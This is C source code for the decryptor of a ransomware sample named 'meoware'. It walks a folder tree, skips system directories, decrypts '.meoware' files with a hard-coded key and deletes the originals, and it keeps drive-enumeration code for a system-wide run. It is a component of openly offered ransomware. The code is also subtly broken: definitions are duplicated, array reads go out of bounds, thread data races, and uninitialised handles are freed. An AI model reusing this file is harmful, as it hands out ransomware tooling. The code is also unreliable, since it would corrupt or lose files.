/*
 * hack-aes-decryptor-original.c
 * Ransomware AES decryption
 * save original extension
 * author @cocomelonc
*/

#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <process.h>
#include <stdbool.h>

#define AES_BLOCK_SIZE 16
#define IN_CHUNK_SIZE (AES_BLOCK_SIZE * 10)
#define OUT_CHUNK_SIZE (IN_CHUNK_SIZE * 2)
#define MAX_THREADS 8  // Adjust as needed
#define MAX_FOLDERS 26
#define MAX_PATH_LENGTH 260

// we do not encrypt sensitive folders and files
const char* blacklistDirectories[] = {
  "C:\\Windows\\",
  "C:\\Program Files (x86)\\",
  "C:\\Program Files\\",
  "C:\\ProgramData\\",
  "Z:\\",
};

// Structure to hold data for each thread
struct ThreadData {
  const char* inputFile;
  const char* outputFile;
  const BYTE* aesKey;
};

#include <windows.h>
#include <stdio.h>
#include <string.h>

#define IN_CHUNK_SIZE (1024*1024) //Example - Adjust if needed.

#include <windows.h>
#include <stdio.h>
#include <string.h>

#define IN_CHUNK_SIZE (1024*1024) //Example - Adjust if needed.

void decryptFile(const char* inputFile, const char* outputFile, const BYTE* aesKey) {
  HCRYPTPROV hCryptProv = NULL;
  HCRYPTKEY hKey = NULL;
  HANDLE hInputFile = INVALID_HANDLE_VALUE;
  HANDLE hOutputFile = INVALID_HANDLE_VALUE;

  DWORD len = strlen((const char*)aesKey);
  DWORD keySize = len; //* sizeof(aesKey[0]);  The key *is* a byte array, so its size is just 'len'


  //Open input and output files
  hInputFile = CreateFileA(inputFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  if (hInputFile == INVALID_HANDLE_VALUE) {
    printf("Error opening input file: %lu\n", GetLastError());
    return; // Or handle the error as needed.
  }


  hOutputFile = CreateFileA(outputFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  if (hOutputFile == INVALID_HANDLE_VALUE) {
    CloseHandle(hInputFile);
    printf("Error opening output file: %lu\n", GetLastError());
    return;
  }




  //Get cryptographic context

  if (!CryptAcquireContextA(&hCryptProv, NULL, "Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
    printf("CryptAcquireContext failed: %lu\n", GetLastError());
    goto cleanup; //Use goto for structured cleanup.
  }




  HCRYPTHASH hHash;


  if (!CryptCreateHash(hCryptProv, CALG_SHA_256, 0, 0, &hHash)) {
    printf("CryptCreateHash failed: %lu\n", GetLastError());
    goto cleanup;
  }



  if (!CryptHashData(hHash, aesKey, keySize, 0)) {
    printf("CryptHashData failed: %lu\n", GetLastError());
    goto cleanup;
  }

  if (!CryptDeriveKey(hCryptProv, CALG_AES_128, hHash, 0, &hKey)) {   // Corrected: Use 0 for dwFlags 
    printf("CryptDeriveKey failed: %lu\n", GetLastError());
    goto cleanup;
  }



  BYTE* chunk = (BYTE*)malloc(IN_CHUNK_SIZE);
  if (chunk == NULL) {
     perror("malloc failed!");
    goto cleanup;
  }


  DWORD outLen;
  BOOL isFinal = FALSE;
  DWORD totalBytesRead = 0;
  DWORD fileSize = GetFileSize(hInputFile, NULL);
  while (TRUE) {
    BOOL bResult = ReadFile(hInputFile, chunk, IN_CHUNK_SIZE, &outLen, NULL);

    if (!bResult) {
      printf("ReadFile failed: %lu\n", GetLastError());
      break; // Or handle the error as needed.
    } else if (outLen == 0) {
      break; // End of file
    }



    totalBytesRead += outLen;

    isFinal = (totalBytesRead >= fileSize); // Set isFinal for the last block

    if (!CryptDecrypt(hKey, NULL, isFinal, 0, chunk, &outLen)) {
      printf("CryptDecrypt failed: %lu\n", GetLastError());
      break;
    }




    DWORD written;
    if (!WriteFile(hOutputFile, chunk, outLen, &written, NULL) || written != outLen) {
      printf("WriteFile failed: %lu\n", GetLastError());
      break;
    }
  }



  CloseHandle(hInputFile); // Close files *before* deleting or renaming!
  CloseHandle(hOutputFile);
  hInputFile = INVALID_HANDLE_VALUE;  // Important to invalidate the handles after closing them.
  hOutputFile = INVALID_HANDLE_VALUE;


  Sleep(30);

  if (!DeleteFileA(inputFile)) {
    printf("Error deleting file %s: %d\n", inputFile, GetLastError());
  } else {
    printf("Successfully deleted the original file: %s\n", inputFile);

  }

  Sleep(30);

  char newFileName[MAX_PATH];
  snprintf(newFileName, MAX_PATH, "%s", inputFile); // Restore original name

  if (MoveFileA(outputFile, newFileName)) {
    printf("Successfully restored original file: %s\n", newFileName);

  } else {
    printf("Error restoring original file: %d\n", GetLastError());
  }

cleanup: // Cleanup resources in all cases
  if (hKey != NULL) CryptDestroyKey(hKey);

  if (hHash != NULL) CryptDestroyHash(hHash);

  if (hCryptProv != NULL) CryptReleaseContext(hCryptProv, 0);

  if(chunk != NULL) free(chunk);
  if(hInputFile != INVALID_HANDLE_VALUE) CloseHandle(hInputFile);
  if (hOutputFile != INVALID_HANDLE_VALUE) CloseHandle(hOutputFile);

}

// encryption function to be called by each thread
unsigned __stdcall decryptFileThread(void* args) {
  struct ThreadData* threadData = (struct ThreadData*)args;
  decryptFile(threadData->inputFile, threadData->outputFile, threadData->aesKey);
  return 0;
}

void decryptFiles(const char* folderPath, const BYTE* key) {
  WIN32_FIND_DATAA findFileData;
  char searchPath[MAX_PATH];
  sprintf_s(searchPath, MAX_PATH, "%s\\*", folderPath);

  HANDLE hFind = FindFirstFileA(searchPath, &findFileData);

  if (hFind == INVALID_HANDLE_VALUE) {
    printf("Error: %d\n", GetLastError());
    return;
  }

  HANDLE threadHandles[MAX_THREADS];
  int threadCount = 0;

  do {
    const char* fileName = findFileData.cFileName;

    if (strcmp(fileName, ".") == 0 || strcmp(fileName, "..") == 0) {
      continue;
    }

    char filePath[MAX_PATH];
    sprintf_s(filePath, MAX_PATH, "%s\\%s", folderPath, fileName);

    int isBlacklisted = 0;
    for (int i = 0; i < MAX_PATH_LENGTH; ++i) {
      if (blacklistDirectories[i] != NULL && strstr(filePath, blacklistDirectories[i]) != NULL) {
        isBlacklisted = 1;
        break;
      }
    }

    if (!isBlacklisted) {
      if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
        // Recursive call for subfolders
        decryptFiles(filePath, key);
      } else {
        // Process individual files
        if (strstr(fileName, ".meoware") != NULL) {
          printf("File: %s\n", filePath);
          char decryptedFilePath[MAX_PATH];
          sprintf_s(decryptedFilePath, MAX_PATH, "%s.decrypted", filePath);
          // decryptFile(filePath, decryptedFilePath, key);
          struct ThreadData threadData = { filePath, decryptedFilePath, key };

          // Start a new thread
          threadHandles[threadCount] = (HANDLE)_beginthreadex(NULL, 0, &decryptFileThread, (void*)&threadData, 0, NULL);
          if (threadHandles[threadCount] == 0) {
            printf("error creating thread\n");
            return;
          }

          threadCount++;

          // Wait for threads to finish before processing the next file
          if (threadCount == MAX_THREADS) {
            WaitForMultipleObjects(threadCount, threadHandles, TRUE, INFINITE);

            // Close thread handles
            for (int i = 0; i < threadCount; i++) {
              CloseHandle(threadHandles[i]);
            }

            threadCount = 0;
          }
          printf("File decrypt: %s OK!\n", filePath);
        }
      }
    }

  } while (FindNextFileA(hFind, &findFileData) != 0);

  // Wait for remaining threads to finish
  WaitForMultipleObjects(threadCount, threadHandles, TRUE, INFINITE);

  // Close thread handles
  for (int i = 0; i < threadCount; i++) {
    CloseHandle(threadHandles[i]);
  }

  FindClose(hFind);
}

void enumerateDrives(char folders[][MAX_PATH_LENGTH], int* folderCount) {
  DWORD drives = GetLogicalDrives();
  char drive[] = "A:\\";
  int driveType;

  for (int i = 0; i < 26; ++i) {
    if (drives & 1) {
      drive[0] = 'A' + i;
      driveType = GetDriveTypeA(drive);

      if (driveType == DRIVE_FIXED || driveType == DRIVE_REMOVABLE) {
        int isBlacklisted = 0;
        for (int j = 0; j < MAX_PATH_LENGTH; ++j) {
          if (blacklistDirectories[j] != NULL && strstr(drive, blacklistDirectories[j]) != NULL) {
            isBlacklisted = 1;
            break;
          }
        }

        if (!isBlacklisted) {
          strcpy_s(folders[*folderCount], drive);
          (*folderCount)++;
        }
      }
    }
    drives >>= 1;
  }
}

int main() {
  const char* rootFolder = "C:\\Users\\user1\\Desktop\\books";
  const char* privateKey = "mymy16ByteKey12";
  decryptFiles(rootFolder, privateKey);
  // char folders[MAX_FOLDERS][MAX_PATH];
  // int folderCount = 0;
  // enumerateDrives(folders, &folderCount);
  // // encrypt the enumerated folders
  // printf("Enumerated Folders:\n");
  // for (int i = 0; i < folderCount; ++i) {
  //   printf("%s\n", folders[i]);
  //   decryptFiles(folders[i], privateKey);
  // }
  return 0;
}